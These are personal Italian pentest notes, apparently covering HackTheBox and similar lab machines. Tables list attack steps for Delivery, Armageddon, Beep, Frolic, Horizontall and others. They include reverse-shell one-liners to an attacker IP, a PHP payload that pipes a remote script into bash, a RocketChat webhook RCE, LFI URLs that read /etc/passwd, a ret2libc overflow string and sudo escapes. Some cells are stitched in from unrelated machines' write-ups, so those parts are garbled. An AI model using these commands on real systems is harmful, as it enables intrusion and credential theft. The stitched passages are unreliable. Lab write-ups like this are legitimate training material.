#Privesc_Linux 

##### Exploitations
- [[#CMS]]
	1. [[#Armageddon]]
	2. [[#Beep]]
	3. [[#Blunder]]
	4. [[#Frolic]]
	5. [[#Horizontall]]
	6. [[#Mirai]]
	7. [[#Nibble]]
	8. [[#OpenAdmin]]
	9. [[#Swagshop]]
	10. [[#Cronos]]
	11. [[#Passage]]
	12. [[#Popcorn]]
	13. [[#Ready]]
	14. [[#Devvortex]]
	15. [[#Broker]]
	16. [[#BoardLight]]
- [[#Wordpress]] 
	1. [[#Blocky]]
	2. [[#MrRobot]]
	3. [[#Nukem]]
	4. [[#Internal]]
	5. [[#Loly]]
	6. [[#Blogger]]
- [[#Server-Side Template Injection (SSTI)]]
	1. [[#Doctor]]
- [[#Samba]]
	1. [[#Friendzone]]
	2. [[#Skynet]]
- [[#Web shell]]
	1. [[#Bashed]]
	2. [[#CmesS]]
- [[#Web Server]]
	1. [[#Knife]]
	2. [[#Shocker]]
	3. [[#Traverxec]]
	4. [[#Tabby]]
- [[#RCE]]
	1. [[#Nibbles]]
	2. [[#Zenphoto]]
	3. [[#Clue]]
	4. [[#Extplorer]]
	5. [[#Walla]]
	6. [[#Sybaris]]
	7. [[#Peppo]]
	8. [[#Astronaut]]
	9. [[#Marketing]]
	10. [[#Exfiltrated]]
	11. [[#Thompson]]
	12. [[#Wombo]]
	13. [[#Flu]]
	14. [[#Roquefort]]
	15. [[#Levram]]
	16. [[#LaVita]]
	17. [[#Zeno]]
	18. [[#Vmdak]]
	19. [[#BBScute]]
	20. [[#Bamboo]]
	21. [[#Analytics]]
	22. [[#UpDown]]
- [[#Command Injection]]
	1. [[#Luanne]]
	2. [[#Haircut]]
	3. [[#Pelican]]
	4. [[#Hetemit]]
	5. [[#Ultratech]]
	6. [[#Ochima]]
	7. [[#Busqueda]]
- [[#File Upload]]
	1. [[#Networked]]
	2. [[#Postman]]
	3. [[#ScriptKiddies]]
	4. [[#Magic]]
	5. [[#Payday]]
	6. [[#Mzavee]]
	7. [[#Lazy admin]]
	8. [[#Rootme]]
	9. [[#Wallpaper Hub]]
	10. [[#Zab]]
	11. [[#Zipper]]
	12. [[#Pilgrimage]]
	13. [[#Help]]
- [[#User enumeration]]
	1. [[#Sunday]]
- [[#Heartbleed]]
	1. [[#Valentine]]
- [[#SSRF]]
	1. [[#Forge]]
	2. [[#Editorial]]
- [[#Git]]
	1. [[#GitHappens]]
- [[#SQL Injection]]
	1. [[#Jarvis]]
	2. [[#Pebbles]]
	3. [[#Cockpit]]
	4. [[#Hawat]]
	5. [[#DailyBugle]]
	6. [[#Quackerjack]]
	7. [[#GameZone]]
	8. [[#Usage]]
- [[#Default Credentials]]
	1. [[#Keeper]]
- [[#NoSQLi]]
	1. [[#Mango]]
- [[#LFI]]
	1. [[#Nineveh]]
	2. [[#Poison]]
	3. [[#Apex]]
	4. [[#Readys]]
	5. [[#Tomghost]]
	6. [[#SPX]]
	7. [[#Mantis]]
	8. [[#FunBoxEasy]]
- [[#Arbitrary File Read]]
	1. [[#Builder]]
	2. [[#LinkVortex]]
- [[#RFI]]
	1. [[#Snookums]]
	2. [[#Fanatastic]]
	3. [[#Data]]
- [[#API]]
	1. [[#Node]]
	2. [[#Hunit]]
	3. [[#XposedAPI]]
	4. [[#Amaterasu]]
	5. [[#Mentor]]
	6. [[#Monitored]]
- [[#BoF]]
	1. [[#Kevin]]
- [[#Phishing]]
	1. [[#Postfish]]
- [[#Authentication Bypass]]
	1. [[#Silver Platter]]
	2. [[#Fired]]
	3. [[#Scrutiny]]
	4. [[#SpiderSociety]]
	5. [[#Potato]]
	6. [[#Cozyhosting]]
- [[#Sandbox Escape]]
	1. [[#Codify]]
- [[#SNMP]]
	1. [[#Pandora]]
	2. [[#Underpass]]
- [[#Others]]
	1. [[#Ophiuchi]]
	2. [[#Pit]]
	3. [[#ClamAV]]
	4. [[#Bratarina]]
	5. [[#PC]]
	6. [[#Sorcerer]]
	7. [[#Kenobi]]
	8. [[#Boiler CTF]]
	9. [[#BitForge]]
	10. [[#Stapler]]
	11. [[#Sync]]
	12. [[#Forgotten]]
	13. [[#Lock]]
	14. [[#Precious]]
##### Privileges Escalation
- **SUDO**
	1. [[#Armageddon]]
	2. [[#Blunder]]
	3. [[#Blocky]]
	4. [[#Knife]]
	5. [[#Traverxec]]
	6. [[#Jarvis]]
	7. [[#Pelican]]
	8. [[#Hetemit]]
	9. [[#CozyHosting]]
	10. [[#Devvortex]]
	11. [[#Broker]]
	12. [[#UpDown]]
	13. [[#Precious]]
	14. [[#Monitored]]
	15. [[#Editorial]]
	16. [[#LinkVortex]]
- **SUID**
	1. [[#Frolic]]
	2. [[#Friendzone]]
	3. [[#Jarvis]]
	4. [[#MrRobot]]
	5. [[#Nukem]]
	6. [[#Quackerjack]]
	7. [[#Pandora]]
	8. [[#BoardLight]]
- **Credential Reused**
	1. [[#Delivery]]
	2. [[#Beep]]
	3. [[#Blocky]]
	4. [[#Doctor]]
	5. [[#Friendzone]]
	6. [[#Luane]]
	7. [[#Magic]]
	8. [[#Payday]]
- **Cronjob**
	1. [[#Bashed]]
	2. [[#Cronos]]
	3. [[#Thompson]]
	4. [[#Amaterasu]]
	5. [[#Pilgrimage]]
- **Kernel Exploitation**
	1. [[#Horizontall]]
	2. [[#Analytics]]
	3. [[#Snookums]]
	4. [[#Help]]
- **Command Injection**
	 1. [[#ScriptKiddies]]
	 2. [[#Exfiltrated]]
	 3. [[#UpDown]]
- **SSH**
	1. [[#Traverxec]]
	2. [[#Passage]]
	3. [[#Builder]]
- **Groups**
	1. [[#Tabby]]
	2. [[#ExtPlorer]]
- **Process**
	1. [[#Valentine]]
	2. [[#Haircut]]
- **Hijacking**
	1. [[#Magic]]
- **Wildecard**
	1. [[#Potato]]
	2. [[#Skynet]]
	3. [[#Usage]]
- **Others**
	1. [[#Popcorn]]
	2. [[#Ready]]
## CMS

### Delivery

| **üß† Azione**              | **üíª Comando / Metodo**                                                                                   | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | --------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Riconoscimento CMS**     | Nel source code vedo che c'√® un riferimento a `helpdesk.delivery.htb`                                     |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **OsTicket**               | Vedo che utilizza CMS `OsTicket` con riferimento a 2021                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Account nuovo osTicket** | Creo un account `test@test.com`. Adesso posso vedere lo status dei ticket                                 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Account mattermost**     | Creo una account nuovo su `delivery.htb:8065` con nome utente uguale all'id del ticket.                   | Mandano una mail dove io posso vedere il ticket 1. Access ftp by ftp@192.168.x.110 with ftp:ftp or even with ssh<br>ftp ftp@192.168.x.110<br>ftp> passive<br>2. Access backup folder. You have to disable host firewall if you use Kali virtual machine<br>cd /mnt/backup/etc<br>3. Then download shadow and passwd files<br>ftp> get passwd<br>ftp> get shadow<br>4. Now we have to unshadow the files<br>unshadow passwd shadow > unshadowed.txt<br>5. Then use johntheripper to crack the hashes and found lisa password which is peanut<br>21 22 80 Index of .env 1john --format=crypt ‚Äìwordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt<br>6. Now u can ssh as lisa<br>ssh lisa@192.168.x.110 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"<br>7. Run sudo -l then you can see the user can run /usr/bin/strace as root<br>Follow GTFObins instruction and u rooted the machine<br>sudo /usr/bin/strace -o /dev/null /bin/sh |
| **Utente ssh**             | `maildeliverer:Youve_G0t_Mail!`                                                                           | Entro dentro mattermost con le nuove credenziali e trovo le credenzilai per ssh                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Config file**            | `cat opt/mattermost/config/config.json`                                                                   | Troviamo le credenziali per MySQL locale `mmsuer: Crack_The_MM_Admin_PW@tcp`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Database MySQL**         | `mysql -u mmuser -p`                                                                                      | Entriamo dentro il database locale con password `Crack_The_MM_Admin_PW@tcp`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **MySQL Users**            | `Describe Users;`<br>`SELECT Username, Pssword FROM Users`                                                | Ottengo la password hashata di `mattermost`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Password candidate**     | `nano pw` inserisco pleasesubscribe!<br><br>`hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule` | Creo una lista di password candidate che iniziano con 'pleasesubcribe!'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Root flag**              | `hashcat -m 3200 hash password --user -r /usr/share/hashcat/rules/best64.rule`                            | Decripto l'hash ed entro come root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
- [writeup](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html)
### Armageddon

| **üß† Azione**                            | **üíª Comando / Metodo**                                                 | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ---------------------------------------- | ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Riconoscimento CMS**                   | Visito `http://10.10.10.233/` nel browser                               | Scopro che √® *Drupal 7* (banner, HTML, etc.) 21 22 80 443 Teaching and Learning Center<br>21/tcp open ftp vsftpd 3.0.5<br>22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>80/tcp open http Apache httpd 2.4.52 ((Ubuntu))<br>443/tcp open http Apache httpd 2.4.52<br><br>1. FTP login anonymous and mget 2 files on /interns/backup/users/malika/.mozilla/firefox/3ot0ydzb.default.<br>Crack them with Firepwd and we have password of malika.<br>SSH with malike - Anisoptera<br>Odonata4!<br><br>_<br><br>2. LPE Bad way: Use this # CVE-2024-1086 to do LPE and you got root.<br>3. Run linpeas and found a local service running on port 3000 name rocket.chat<br>(RocketChat running on local port 3000 and MongoDb running on local port 27017).<br>In order to access these ports from the outside, it was necessary to tunnel them via ssh using the command on Kali:<br>ssh -L 3000:127.0.0.1.1:3000 malika@192.168.x.110<br>ssh -L 27017:127.0.0.1:27017 malika@192.168.x.110<br><br>The idea is to access rocketchat with admin ‚Üí from admin to RCE<br>4. First create a test account on this site.<br>Now get back to malika shell, do the following steps to login mongo console:<br>21 22 80 443 Teaching and Learning Center 1cd /snap/rocketchat-server/x1/bin<br>./mongo<br><br>5. Dump all information about users:<br>rs0:PRIMARY> use parties<br>rs0:PRIMARY> db.user<br>rs0:PRIMARY> db.users.find()<br>6. Now update role our test user to admin:<br>rs0:PRIMARY> db.users.update({_id:"emz2ktsDPLNjCz9Cm"},{$set:{roles:["admin"]}})<br>Login to RocketChat with our admin account.<br>7. Once have accessed the RocketChat panel, follow the steps on hacktrick-pentesting-web/rocket-chat to get a reverse<br>shell with Administrator privileges.<br>Create a webhook Integrattion, on Script section add this:<br>const { exec } = this.constructor.constructor('return this.process')().mainModule.require<br>('child_process')<br>exec("bash -c 'bash -i >& /dev/tcp/KALI_IP/443 0>&1'")<br><br>Save it then the Rocketchat will return us a sample curl to call this webhook.<br><br>curl -X POST -H 'Content-Type: application/json' --data '{"text":"Example message","attach<br><br>ments": [{"title":"Rocket.Chat","title_link":"https://rocket.chat","text":"XXX","image_ur<br><br>l":"/images/integration-attachment-example.png","color":"#764FA5"}]}' http://localhost:300<br><br>0/hooks/hook_url<br><br>8. At this point, only need put a nc listening in the 80 port, and run that curl on malika shell then you got root. |
| **Conferma vulnerabilit√† CVE-2018-7600** | Uso Metasploit: `use exploit/unix/webapp/drupal_drupalgeddon2`          | Conferma target vulnerabile                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **Sfrutto RCE via Metasploit**           | `set RHOSTS 10.10.10.233; set LHOST <tuo IP>; set TARGETURI /; run`     | Ottengo shell `www-data` con Meterpreter                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Ricognizione post-sfruttamento**       | `cat sites/default/settings.php`                                        | Trovo credenziali MySQL: `dbuser / dbpassword`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **Uso delle credenziali MySQL trovate**  | `ssh brucetherealadmin@10.10.10.233`<br>                                | Cambio utente a `armageddon`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Privilege escalation a root**          | `sudo -l` ‚Üí mostra che pu√≤ eseguire `/usr/bin/snap install *` come root | Sfrutto `snap` per ottenere root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Esecuzione payload Snap**              | [GitfObins](https://gtfobins.github.io/gtfobins/snap/#sudo)             | Ottengo shell come `root`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
- [writeup](https://doomdesire.medium.com/armageddon-writeup-hackthebox-f1044e3582bc)
### Beep

#### Exploit 1

| **üß† Azione**                  | **üíª Comando / Metodo**                                                                               | **üìù Output / Scopo**                                    |
| -------------------------- | ------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| **Individuazione del CMS** | Visita `http://<IP>` e leggi il banner                                                            | Scopri che √® un server *FreePBX* (basato su Elastix) |
| **Identifica la versione** | Visualizza sorgente della pagina o `/admin/config.php`                                            | Conferma *FreePBX <= 2.10.0*                         |
| **Cerca CVE noto**         | Ricerca su Exploit-DB ‚Üí [CVE-2012-4869](https://github.com/cyberdesu/Elastix-2.2.0-CVE-2012-4869) | Trova exploit RCE via ping test                      |
| **Sfrutta RCE**            | Inserisci comandi tipo `; nc -e /bin/sh <KALI-IP> 4444` nel form di test                          | Reverse shell come utente `asterisk`                 |

#### Exploit 2

| **üß† Azione**              | **üíª Comando / Metodo**                                                                                                          | **üìù Output / Scopo**            |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| **Individuazione del CMS** | Visita `http://<IP_vittima>` e leggi il banner                                                                                   | Scopri che √® un server *Elastix* |
| **Cerca CVE noto**         | Ricerca su Exploit-DB ‚Üí [LFI](https://www.exploit-db.com/exploits/37637)                                                         | Trova exploit LFI                |
| **Credenziali**            | `https://<IP_vittima>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` | Trova password                   |
| **Username**               | `https://<IP_vittima>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&acti`          | Trova username                   |
| **Hydra**                  | `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<IP_vittima>`                                         |                                  |

#### Exploit 3

| **üß† Azione**                          | **üíª Comando / Metodo**                                            | **üìù Output / Scopo**                                    |
| ---------------------------------- | -------------------------------------------------------------- | ---------------------------------------------------- |
| **Ricerca di credenziali**         | Lettura del file `/etc/elastix.conf`                           | Trovata password `jEhdIekWmdjE` utilizzata pi√π volte |
| **Tentativo di accesso come root** | Connessione SSH: `ssh root@10.10.10.7` con la password trovata | Accesso ottenuto come utente `root`                  |
| **Raccolta delle flag**            | Lettura dei file `user.txt` e `root.txt`                       | Recupero delle flag per completare la macchina       |
- [writeup](https://medium.com/@StitchedCubez/hackthebox-beep-walkthrough-a3dac30e642c)
### Blunder

| üß† **Azione**                     | üíª **Comando / Metodo**                                                                                           | üìù **Output / Scopo**                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| **Enumerazione directory**        | utilizzo `dirbuster`                                                                                              | Trovo `/admin` e `/todo.txt` dove trovo utente `fergus` |
| **User enumeration su Bludit**    | Nel codice sorgente di `/admin` vedo che il CMS √® `Bludit 3.2.9`                                                  |                                                         |
| **Accesso a Bludit (fergus)**     | Login con `fergus` + bruteforce password (`rockyou.txt`) usando `CVE-2019-17240`                                  | Accesso al CMS Bludit come `fergus`                     |
| **Accesso www-data**              | uso il modulo di Metasploit `exploit/linux/http/bludit_upload_images_exec` per una RCE                            | Sfruttare `CVE-2019-16113`                              |
| **Analisi file Bludit users.php** | Leggo file di configurazione in `/var/www/bludit-3.10.0/bl-content/databases/users.php` di Bludit con hash e salt | Raccolgo hash e salt per `Hugo`                         |
| **Tentativo di crack dell'hash**  | uso `Crackstation` per craccare pass                                                                              | la password √® `Password120`                             |
| **Verifica privilegi sudo**       | `sudo -l`                                                                                                         | `hugo` pu√≤ eseguire `/bin/bash` come `(ALL, !root)`     |
| **Bypass sudo !root restriction** | `sudo -u#-1 /bin/bash`                                                                                            | Ottengo shell root üè¥                                   |
- [writeup](https://netosec.com/blunder-hackthebox-writeup/)
### Frolic

| üß† **Azione**                 | üíª **Comando / Metodo**                                                                                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                              |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fuzzing directories**       | `..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!?!.?` | Con gobuster trovo i path `/admin`,`/loop`, `users.txt` e `/passwords.txt`. In `/admin` source code trovo un javascript con un'altra password dove trovo un codice. Googlandolo trovo che il sito [dcode](https://www.dcode.fr/ook-language) pu√≤ decodificarlo. Porta al path `/asdiSIAJJ0QWE9JAS` |
| **Base64**                    | 1. `UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXguc...`<br>2. `zip2john file.zip > hash`<br>3. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`                                                                                      | Trovo un Base64 che decodifico e vedo dalla firma PK che si tratta di un file zippato. Restituisce un hash che cracco trovando la password `idkwhatispass` che utilizzo per entrare in `/playsms`                                                                                                  |
| **PlaySMS**                   | 1. `<?php system('curl 10.10.16.18:8000/rev_shell.sh \| bash'); ?>, 2, 3`<br>2. In rev_shell.sh: `bash -c 'bash -i >& /dev/tcp/10.10.16.18/4444 0>&1`<br>3. `python3 -m http.server 8000`<br>4. `nc -lvnp 4444`                               | Carico un file php malevolo nella sezione "send from file" come descritto nella [CVE-2017-9080](https://www.exploit-db.com/exploits/44599) ed ottendo l'accesso                                                                                                                                    |
| **Buffer Overflow detecting** | 1. `./rop $(python3 -c "print('A'*200)")`                                                                                                                                                                                                     | Trovo in `/home/ayush/.binary` un file SUID. Testo la *1.* e capisco che √® vulnerabile a Buffer Overflow poich√© mi restituisce `segmentation fault`                                                                                                                                                |
| **Buffer Overflow offset**    | 1. `pattern_create.rb -l 100`<br>2. `gdb rop`<br>3. `-r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....`<br>4. `pattern_offset.rb -q 0x62413762`                                                                                                           | Carichiamo il file rop in locale, creaiamo una stringa di 100 caratteri (1.) ed avviamo gdb (2.), dal suo outpute calcoliamo l'offset (3.).<br><br>                                                                                                                                                |
| **Buffer Overflow /bin/sh**   | 1. `ldd rop`<br>2. `readelf -s /lib/i386-linux-gnu/libc.so.6 \| grep " system@"`<br>3. `readelf -s /lib/i386-linux-gnu/libc.so.6 \| grep " exit@"`<br>4. `strings -a -t x /lib/i386-linux-gnu/libc.so.6 \| grep /bin/sh`                      | Sulla macchina vittima eseguiamo i comandi 1.,2.,3. per conoscere rispettivamente gli indirizzi della libreria `libc.so.6` dove sono presenti funzioni `system()` , `exit()` e `/bin/sh`<br>                                                                                                       |
| **Buffer Overflow sum**       | `1. + 2.`<br>`1. + 3.`<br>`1. + 4.`                                                                                                                                                                                                           | Sommiamo l'output del primo (1.) con ciascuno                                                                                                                                                                                                                                                      |
| **Root**                      | `./rop $(python -c 'print("A"52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')`                                                                                                                                            | Effettuiamo l'exploit e diventiamo `root`                                                                                                                                                                                                                                                          |
- [writeup](https://infosecmatt.medium.com/hackthebox-frolic-walkthrough-3c401d5a99f6)
### Horizontall

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                    |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Hosts**         | `nano /etc/hosts`                                                                                                                                              | Dalla pagina iniziale intuisco che bisogna inserire nel fil `/etc/hosts` il FQDN `horizont                                                                                                               |
| **JavaScript**    |                                                                                                                                                                | Da un file `.js` trovo che esiste un sottodominio di nome `api-prod.hori                                                                                                                                 |
| **Strapi CMS**    | 1. `python3 50239.py http://api-prod.horizontall.htb`<br>2. `nc -lvnp 4444`<br>3. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc 10.10.16.7 4444 >/tmp/f` | Il CMS √® vulnerabile a [CVE-2019-19609](https://www.exploit-db.com/exploits/50239), dopo la *1.* avvio la revshell *2.*                                                                                  |
| **Laravel**       | 1. `./LinEnum.sh`<br>2. *MIA: *`./chisel server --reverse -p 9999`<br>3. *TARGET:* `./chisel client 10.10.14.5:9999 R:8000:127.0.0.1:8000`                     | Con LinEnum.sh *1.* noto che la porta `localhost:8000` √® aperta, dunque faccio tunneling con chisel *2.* e *3.* per navigarla sul browser. Trovo *Laravel* ma non √® sfruttabile per priv escalation      |
| **PwnKit e root** | `./expl.sh`                                                                                                                                                    | Da LinEnum noto anche che √® vulnerabile a [PwnKit](https://github.com/mebeim/CVE-2021-4034) pertanto carico tutti i file (`expl.sh`,`helper.c` e `fake_module.c`) sulla macchina target e divento `root` |
- [writeup](https://medium.com/@Inching-Towards-Intelligence/htb-horizontall-95a5a4cb4b83)
### Mirai

| üß† **Azione** | üíª **Comando / Metodo**             | üìù **Output / Scopo**                                                                                                                                                     |
| ------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Pi-Hole**   |                                     | Con la dirsearch trovo la cartella /admin sulla porta 80 su cui gira `Pihole`                                                                                             |
| **SSH**       | `ssh @IP_VITTIMA`                   | Cerco le credenziali di default `pi:raspberry` di Pihole per accedere alla pagina, ma non funzionano. Con le stesse credenziali riesco ad accedere ad SSH                 |
| **USB**       | 1. `lsblk`<br>2. `strings /dev/sdb` | Controllo i dispositivi montati, tra gli elenchi appare una chiavetta USB. Su `/dev/sdb` trovo tutto lo storico della chiavetta dove trovo la passowrd dell'utente `root` |
- [writeup](https://medium.com/@surajtheekshanahackerone/hackthebox-mirai-writeup-a5aab5694de5)
### Nibble

| üß† **Azione**  | üíª **Comando / Metodo**                                                                 | üìù **Output / Scopo**                                                                                                                                                                 |
| -------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Nibbleblog** |                                                                                         | Nel path `/nibbleblog/install.php` trovo riferimenti al file `users.php` dov'√® presente lo username dell'amministratore. Utilizzo una password di default per entrare `admin:nibbles` |
| **SSH**        | `use multi/http/nibbleblog_file_upload`                                                 | utilizzo il modulo di metasploit per una RCE                                                                                                                                          |
| **USB**        | 1. `sudo -l`<br>2. `echo "#! /bin/bash" > monitor.sh && echo "/bin/bash" >> monitor.sh` | Dalla *1.* capisco che se unzippo il file `personal.zip` posso eseguire il suo contenuto come amministratore con la *2.*                                                              |
- [writeup](https://medium.com/@ruruuu/hackthebox-nibbles-writeup-46de768e70c7)
### OpenAdmin

| üß† **Azione**           | üíª **Comando / Metodo**                                                                             | üìù **Output / Scopo**                                                                                                                                                                                                    |
| ----------------------- | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **source code**         | `python3 ona-rce.py http://10.10.10.171 exploit`                                                    | Nel source code della directory `/music` trovo tra gli href un riferimento alla pagina `/ona` da cui deduco che √® installa `OpenNetAdmin 18.1.1`. La versione √® vulnerabile a [RCE](https://github.com/amriunix/ona-rce) |
| **nuova shell**         | `wget http://IP_KALI/shell.py \| python`                                                            | Una volta dentro avvio una seconda reverse shell poich√© la prima ha pochi permessi.                                                                                                                                      |
| **File config**         | `ssh jimmy@IP_VITTIMA`                                                                              | In `/local/config` trovo le credenziali al database `ona_sys:n1nj4W4rri0R!` che riusandole per jimmy accedo tramite ssh                                                                                                  |
| **RSA**                 | 1. `netstat -a`<br>2. `find -user jimmy -ls 2>/dev/null`                                            | Adocchio una porta aperta con la *1.* e trovo tra i file usati da jimmy il main.php *2.* avente la RSA dell'utente joanna                                                                                                |
| **Cracking passphrase** | 1. `ssh2john id_rsa > hash`<br>2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`           | l'RSA ha un passphrase e quindi non posso entrare in ssh. Rendo il file leggibile a john *1.* e poi lo cracco *2.*                                                                                                       |
| **Root**                | 1. `sudo -l`<br>2. `sudo /bin/nano file`<br>3. *CTRL+R *<br>4. *CTRL+X*<br>5. `reset; sh 1>&0 2>&0` | Tra i permessi sudo √® presente il comando nano che secondo [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo) √® vulnerabile.                                                                                     |
- [writeup](https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html)
### Swagshop

| üß† **Azione**   | üíª **Comando / Metodo**                                     | üìù **Output / Scopo**                                                                                                                                            |
| --------------- | ----------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **source code** | `php magescan.phar scan:all http://IP_TARGET`               | Utilizziamo `magescan` scaricato da questo [link](https://github.com/steverobbins/magescan) per scansionare `Magento`                                            |
| **Patch**       | `ptyhon3 cve.py http://IP_TARGET/index.php/admin/ "whoami"` | Troviamo la versione ed i patches utilizzati. Il patch *SUPEE-5344* √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/37977)                             |
| **Root**        | 1. `sudo -l`<br>2. `sudo vi -c ':!/bin/sh' /dev/null`<br>`  | Una volta dentro scopriamo che l'utente pu√≤ eseguire come sudo il comando vi che sencondo [GTFObins](https://gtfobins.github.io/gtfobins/vi/#sudo) √® vulnerabile |
- [writeup](https://cyberkareem.medium.com/hackthebox-swagshop-walkthrough-57b40fe047f0)
### Cronos

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                              |
